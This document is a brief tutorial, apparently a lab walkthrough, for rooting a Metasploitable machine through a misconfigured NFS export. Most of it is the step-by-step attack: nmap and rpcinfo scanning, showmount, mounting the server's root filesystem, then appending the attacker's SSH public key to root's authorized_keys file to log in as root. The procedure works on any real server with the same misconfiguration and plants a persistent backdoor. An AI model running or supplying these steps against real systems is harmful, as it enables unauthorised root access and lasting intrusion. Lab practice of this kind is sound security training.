# NFS server exploit
This tutorial will show you how to exploit a misconfigured NFS server to gain root access to the metasploitable server. Before we start i want to explain what a NFS server is. NFS stands for Network File System (NFS) is a distributed file system protocol allowing a user on a client computer to access files over a computer network much like local storage is accessed. NFS, like many other protocols, builds on the Open Network Computing Remote Procedure Call (ONC RPC) system.


### 1.  SCANNING
We will start with a nmap scan.

    nmap -sS 192.168.2.0
    rpcinfo -p 192.168.2.0
You will now should see a list of Damons and services. Next we need to figure out which of these services is sharing. For that type:

    showmount -e 192.168.2.0
If you see something like / * symbolizes the root directory let's see if we can mount the directory on our local system. Before we do that we need to create a temporary directory which where the mount will be placed.

    mkdir /tmp/nfs
So here we created a directory called NFS. Now we can try to mount the shared directory.

    mount -o nolock -t nfs 192.168.2.0:/ /tmp/nfs
And this is saying that we want to mount the root directory of the metasploitable server into our nfs directory. So hit enter. So we have now succesfully mounted the shared directory. This means we have root access to the main exploitable server. Now we are going to use that root access to add or private ssh key to the autorized keys file. If you didn't already do it, I will generate a new ssh key.

    ssh-keygen
Now we are ready to place or ssh key in the table server authorized keys file.

    cat .ssh/id_rsa.pub >> /tmp/nfs/root/.ssh/authorized_keys
Now we can unmount the shared directory and access the metasploitable server via ssh.

  umount /tmp/nfs
  
Finally login trough ssh by typing:
    
    ssh root@192.168.2.0
